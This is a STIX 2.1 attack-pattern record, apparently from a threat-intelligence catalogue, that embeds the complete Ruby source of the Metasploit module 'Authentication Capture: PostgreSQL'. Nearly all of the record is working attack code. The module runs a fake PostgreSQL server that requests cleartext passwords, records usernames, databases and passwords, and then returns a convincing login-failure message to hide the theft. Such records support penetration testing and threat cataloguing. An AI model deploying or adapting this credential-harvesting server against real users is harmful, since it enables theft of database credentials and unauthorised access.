{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--577bf324-c4e6-4632-9de7-3316ceb25d45",
    "created": "2024-08-14T16:22:00.818148Z",
    "modified": "2024-08-14T16:22:00.818152Z",
    "name": "Authentication Capture: PostgreSQL",
    "description": " This module provides a fake PostgreSQL service that is designed to capture clear-text authentication credentials.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/postgresql.rb",
            "external_id": "postgresql.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'           => 'Authentication Capture: PostgreSQL',\n      'Description'    => %q{\n        This module provides a fake PostgreSQL service that is designed to\n        capture clear-text authentication credentials.},\n      'Author'         => 'Dhiru Kholia <dhiru[at]openwall.com>',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [[ 'Capture', 'Description' => 'Run PostgreSQL capture server' ]],\n      'PassiveActions' => [ 'Capture' ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 5432 ]),\n      ])\n  end\n\n  # This module is based on MySQL capture module by Patrik Karlsson.\n  # Reference: http://www.postgresql.org/docs/9.2/static/protocol-message-formats.html\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    exploit()\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_client_connect(c)\n    @state[c] = {\n      :name    => \"#{c.peerhost}:#{c.peerport}\",\n      :ip      => c.peerhost,\n      :port    => c.peerport,\n    }\n    @state[c][\"status\"] = :init\n  end\n\n  def on_client_data(c)\n    data = c.get_once\n    return if not data\n    length = data.slice(0, 4).unpack(\"N\")[0]\n    if length == 8 and @state[c][\"status\"] == :init\n      # SSL request\n      c.put 'N'\n      @state[c][\"status\"] = :send_auth_type\n    elsif @state[c][\"status\"] == :send_auth_type\n      # Startup message\n      data.slice!(0, 4).unpack(\"N\")[0] # skip over length\n      data.slice!(0, 4).unpack(\"N\")[0] # skip over protocol\n      sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack(\"C*\")\n      c.put sdata\n      data.slice!(0, 5) # skip over \"user\\x00\"\n      @state[c][:username] = data.slice!(0, data.index(\"\\x00\") + 1).unpack(\"Z*\")[0]\n      data.slice!(0, 9) # skip over \"database\\x00\"\n      @state[c][:database] = data.slice!(0, data.index(\"\\x00\") + 1).unpack(\"Z*\")[0]\n      @state[c][\"status\"] = :pwn\n    elsif @state[c][\"status\"] == :pwn and data[0] == 'p'\n      # Password message\n      data.slice!(0, 5).unpack(\"N\")[0] # skip over length\n      @state[c][:password] = data.slice!(0, data.index(\"\\x00\") + 1).unpack(\"Z*\")[0]\n      report_cred(\n        ip: c.peerhost,\n        port: datastore['SRVPORT'],\n        service_name: 'psql_client',\n        user: @state[c][:username],\n        password: @state[c][:password],\n        proof: @state[c][:database]\n      )\n      print_good(\"PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}\")\n      # send failure message\n      sdata = [ 0x45, 97 - 8 + @state[c][:username].length].pack(\"CN\")\n      sdata << \"SFATAL\"\n      sdata << \"\\x00\"\n      sdata << \"C28P01\"\n      sdata << \"\\x00\"\n      sdata << \"Mpassword authentication failed for user \\\"#{@state[c][:username]}\\\"\"\n      sdata << \"\\x00\"\n      sdata << \"Fauth.c\"\n      sdata << \"\\x00\"\n      sdata << \"L302\"\n      sdata << \"\\x00\"\n      sdata << \"Rauth_failed\"\n      sdata << \"\\x00\\x00\"\n      c.put sdata\n      c.close\n    end\n\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\nend\n"
}